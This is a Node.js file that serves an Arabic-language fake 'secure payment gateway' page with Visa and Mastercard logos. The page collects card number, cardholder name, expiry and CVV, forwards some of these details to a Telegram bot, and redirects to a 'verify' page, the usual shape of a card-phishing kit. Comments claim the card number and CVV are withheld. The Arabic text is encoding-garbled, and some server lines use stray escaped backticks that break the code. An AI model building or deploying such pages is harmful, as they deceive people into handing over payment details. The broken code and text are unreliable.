/**
 * app.js
 *
 * Ù…Ù„Ù ÙˆØ§Ø­Ø¯ (Ø®Ø§Ø¯Ù… + ÙˆØ§Ø¬Ù‡Ø©) â€” ÙŠÙ‚Ø¯Ù… ØµÙØ­Ø© "Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¢Ù…Ù†Ø©" ÙˆÙŠÙØ±Ø³Ù„ Ø¥Ø´Ø¹Ø§Ø±Ø§Øª ØªØ¬Ø±ÙŠØ¨ÙŠØ©
 * Ø¥Ù„Ù‰ Ø¨ÙˆØª ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ ÙÙŠ Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¨ÙŠØ¦Ø© (.env).
 *
 * Ø£Ù…Ø§Ù† Ù…Ù‡Ù…: Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ùˆ CVV **Ù„Ù†** ÙŠÙØ±Ø³Ù„Ø§Ù Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù… Ø£Ùˆ ÙŠÙØ®Ø²Ù‘Ù†Ø§. Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø­Ø³Ø§Ø³Ø©.
 *
 * ØªØ´ØºÙŠÙ„:
 * 1) Ø§Ø­ÙØ¸ Ù‡Ø°Ø§ Ø§Ù„Ù…Ù„Ù ÙƒÙ€ app.js
 * 2) Ø£Ù†Ø´Ø¦ Ù…Ù„Ù .env ÙÙŠ Ù†ÙØ³ Ø§Ù„Ù…Ø¬Ù„Ø¯ ÙˆØ§Ø¯Ø®Ù„:
 *    TELEGRAM_BOT_TOKEN=PUT_YOUR_TOKEN_HERE
 *    TELEGRAM_CHAT_ID=PUT_YOUR_CHAT_ID_HERE
 *    PORT=3000
 * 3) Ù†ÙÙ‘Ø°:
 *    npm init -y
 *    npm install express axios dotenv
 *    node app.js
 * 4) Ø§ÙØªØ­: http://localhost:3000
 *
 * Ù…Ù„Ø§Ø­Ø¸Ø©: Ù„Ø§ ØªØ¶Ø¹ Ø§Ù„ØªÙˆÙƒÙ† Ø¯Ø§Ø®Ù„ Ù…Ù„ÙØ§Øª HTML/CDN Ø¹Ø§Ù…Ø© â€” Ø§Ø­ØªÙØ¸ Ø¨Ù‡ ÙÙŠ .env ÙÙ‚Ø·.
 */

require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Ø§Ù„ØµÙØ­Ø©: (HTML Ù…Ø·Ø§Ø¨Ù‚ Ù„ØªØµÙ…ÙŠÙ…Ùƒ â€” Ù„ÙƒÙ† Ù…Ø¹ Ø§Ø±Ø³Ø§Ù„ Ø¢Ù…Ù† Ù„Ù„Ø®Ø§Ø¯Ù…)
// Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© Ø§Ù„ÙˆØ­ÙŠØ¯Ø©: ØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø§Ù„Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„ØªÙ„Ø¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø¢Ù…Ù† Ø¥Ù„Ù‰ /submit
const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¢Ù…Ù†Ø©</title>
  <style>
    body {font-family: Arial, sans-serif; direction: rtl; background-color: #f5f5f5; margin: 0; padding: 0;}
    header, footer {background-color: #004080; color: white; text-align: center; padding: 20px 0;}
    main {padding: 20px;}
    form {background-color: white; padding: 20px; border-radius: 8px; max-width: 500px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
    label {display: block; margin-top: 10px;}
    input, select {width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box;}
    .error-message {color: red; font-size: 14px; display: none; margin-top: 10px;}
    button {margin-top: 20px; padding: 10px; width: 100%; background-color: #004080; color: white; border: none; border-radius: 4px; font-size: 16px;}
    .card-logos {display: flex; justify-content: center; gap: 20px;}
    .card-logos img {height: 50px;}
  </style>
</head>
<body>

  <header>
    <div class="card-logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
    </div>
  </header>

  <main>
    <form id="paymentForm">

      <label for="confirmBooking">ØªØ£ÙƒÙŠØ¯ Ø±Ù‚Ù… Ø§Ù„Ø­Ø¬Ø² (6 Ø£Ø±Ù‚Ø§Ù…):</label>
      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />

      <p id="lengthError" class="error-message">
        â— Ø±Ù‚Ù… Ø§Ù„Ø­Ø¬Ø² ÙŠØ¬Ø¨ Ø£Ù† ÙŠØªÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø·.
      </p>

      <label for="cardNumber">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (Ù…Ø«Ù„: 1234-5678-9012-3456):</label>
      <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />

      <label for="cardName">Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</label>
      <input type="text" id="cardName" required />

      <label for="expiryMonth">Ø§Ù„Ø´Ù‡Ø± (MM):</label>
      <select id="expiryMonth" required>
        <option value="">--</option>
        <option>01</option><option>02</option><option>03</option>
        <option>04</option><option>05</option><option>06</option>
        <option>07</option><option>08</option><option>09</option>
        <option>10</option><option>11</option><option>12</option>
      </select>

      <label for="expiryYear">Ø§Ù„Ø³Ù†Ø© (YYYY):</label>
      <select id="expiryYear" required>
        <option value="">--</option>
        <option>2025</option><option>2026</option><option>2027</option>
        <option>2028</option><option>2029</option><option>2030</option>
        <option>2031</option><option>2032</option><option>2033</option>
        <option>2034</option><option>2035</option><option>2036</option>
        <option>2037</option><option>2038</option><option>2039</option>
        <option>2040</option>
      </select>

      <label for="cvv">CVV (3 Ø£Ø±Ù‚Ø§Ù…):</label>
      <input type="text" id="cvv" minlength="3" maxlength="3" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />

      <p id="dateError" class="error-message">
        â— Ù„Ø£Ø³Ø¨Ø§Ø¨ Ø£Ù…Ù†ÙŠØ©ØŒ Ù„Ø§ ÙŠÙ…ÙƒÙ†Ù†Ø§ Ù‚Ø¨ÙˆÙ„ Ø¨Ø·Ø§Ù‚Ø§Øª Ù…Ù†ØªÙ‡ÙŠØ© Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©.  
        Ù†Ø­ØªÙØ¸ Ø¨Ø­Ù‚ Ø±ÙØ¶ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© Ù„Ø­Ù…Ø§ÙŠØªÙƒ Ù…Ù† Ø§Ù„Ø§Ø­ØªÙŠØ§Ù„.
      </p>

      <button type="submit">Ø§Ø¯ÙØ¹ Ø§Ù„Ø¢Ù†</button>
    </form>
  </main>

  <footer>
    Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø© Â© 2025
  </footer>

  <script>
    function formatCardNumber(input) {
      let value = input.value.replace(/[^0-9]/g, "");
      value = value.slice(0, 16);
      let formatted = value.match(/.{1,4}/g);
      input.value = formatted ? formatted.join("-") : "";
    }

    // Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: Ù†Ø±Ø³ÙÙ„ ÙÙ‚Ø· Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†Ø© Ù„Ù„Ø®Ø§Ø¯Ù….
    // Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠØªØ¬Ø§Ù‡Ù„ cardNumber Ùˆ cvv ÙˆÙ„Ø§ ÙŠØ±Ø³Ù„Ù‡Ù…Ø§ Ù„ØªÙ„Ø¬Ø±Ø§Ù….
    document.getElementById("paymentForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      const confirmBooking = document.getElementById("confirmBooking").value;
      const lengthError = document.getElementById("lengthError");
      const dateError = document.getElementById("dateError");

      lengthError.style.display = "none";
      dateError.style.display = "none";

      if (confirmBooking.length !== 6) {
        lengthError.style.display = "block";
        return;
      }

      const month = parseInt(document.getElementById("expiryMonth").value);
      const year = parseInt(document.getElementById("expiryYear").value);

      const now = new Date();
      const currentYear = now.getFullYear();
      const currentMonth = now.getMonth() + 1;
      if (year < currentYear || (year === currentYear && month < currentMonth)) {
        dateError.style.display = "block";
        return;
      }

      // Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„ØªÙŠ Ø³Ù†Ø±Ø³Ù„Ù‡Ø§ Ù„Ù„Ø®Ø§Ø¯Ù… (Ø¢Ù…Ù†Ø©)
      const payload = {
        confirmBooking,
        cardHolder: document.getElementById("cardName").value || '',
        expiryMonth: String(month).padStart(2,'0'),
        expiryYear: String(year)
      };

      try {
        const res = await fetch('/submit', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error(await res.text());
        // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ Ø§Ù„Ù†Ø¬Ø§Ø­ (ØªØ¨Ù‚Ù‰ Ø§Ù„ØµÙØ­Ø© ÙˆØ§Ù„ØªØµÙ…ÙŠÙ… ÙƒÙ…Ø§ Ù‡ÙŠ)
        window.location.href = "verify.html";
      } catch (err) {
        console.error(err);
        alert('âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…');
      }
    });
  </script>

</body>
</html>`;

// Ø®Ø¯Ù…Ø© Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
app.get('/', (req, res) => res.type('html').send(html));

// endpoint Ø¢Ù…Ù†: ÙŠØ³ØªÙ‚Ø¨Ù„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†Ø© ÙÙ‚Ø· ÙˆÙŠØ±Ø³Ù„ Ø±Ø³Ø§Ù„Ø© Ù„ØªÙ„Ø¬Ø±Ø§Ù…
app.post('/submit', async (req, res) => {
  try {
    const BOT = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT = process.env.TELEGRAM_CHAT_ID;
    if (!BOT || !CHAT) {
      return res.status(500).send('Server not configured with Telegram token/chat.');
    }

    // Ø§Ø³ØªÙ„Ù… ÙÙ‚Ø· Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†Ø© Ù…Ù† Ø§Ù„Ø¬Ø³Ù…
    const { confirmBooking = '', cardHolder = '', expiryMonth = '', expiryYear = '' } = req.body || {};

    // ØªØ£ÙƒÙŠØ¯: Ù„Ø§ Ù†Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ù†Ø±Ø³Ù„ Ø£ÙŠ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ø³Ø§Ø³Ø© Ù…Ø«Ù„ cardNumber Ø£Ùˆ cvv
    const msg =
`ğŸ”” Ø¥Ø´Ø¹Ø§Ø± Ø¯ÙØ¹ (ØªØ¬Ø±ÙŠØ¨ÙŠ)
ğŸ”¢ Ø±Ù‚Ù… Ø§Ù„Ø­Ø¬Ø²: ${escape(confirmBooking)}
ğŸ‘¤ Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: ${escape(cardHolder)}
ğŸ“† Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: ${escape(expiryMonth)}/${escape(expiryYear)}
(ØªÙ… ØªØ¬Ø§Ù‡Ù„ Ø£Ø±Ù‚Ø§Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ÙˆCVV Ù„Ø£Ø³Ø¨Ø§Ø¨ Ø£Ù…Ø§Ù†ÙŠØ©)`;

    const url = \`https://api.telegram.org/bot\${BOT}/sendMessage\`;
    const resp = await axios.post(url, { chat_id: CHAT, text: msg }, { timeout: 10000 });

    if (resp.data && resp.data.ok) return res.json({ ok: true });
    return res.status(502).json({ ok: false, error: resp.data });
  } catch (err) {
    console.error('Telegram send error:', err?.response?.data || err.message || err);
    return res.status(500).send('Failed to send to Telegram');
  }
});

// Ù…Ø³Ø§Ø¹Ø¯Ø© Ø¨Ø³ÙŠØ·Ø© Ù„Ù„Ù‡Ø±ÙˆØ¨ Ù…Ù† Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
function escape(s){ return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

app.listen(PORT, () => console.log(\`âœ… Server running on http://localhost:\${PORT}\`));
